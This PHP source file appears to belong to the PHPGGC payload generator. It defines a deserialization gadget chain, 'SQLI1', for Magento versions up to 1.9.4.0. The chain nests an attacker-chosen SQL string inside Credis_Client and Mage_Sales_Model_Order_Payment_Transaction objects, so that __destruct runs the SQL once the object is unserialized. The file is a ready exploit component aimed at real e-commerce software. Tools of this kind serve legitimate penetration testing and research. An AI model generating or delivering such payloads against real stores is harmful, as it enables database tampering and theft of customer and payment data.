<?php

namespace GadgetChain\Magento;

# Reference: https://maxchadwick.xyz/blog/using-cve-2016-4010-gadget-chain-in-magento-1
class SQLI1 extends \PHPGGC\GadgetChain\SqlInjection
{
    public static $version = '? <= 1.9.4.0';
    public static $vector = '__destruct';
    public static $author = 'mpchadwick';

    public function generate(array $parameters)
    {
        $sql = $parameters['sql'];

        return new \Credis_Client(
            new \Mage_Sales_Model_Order_Payment_Transaction(
                $sql
            )
        );
    }
}
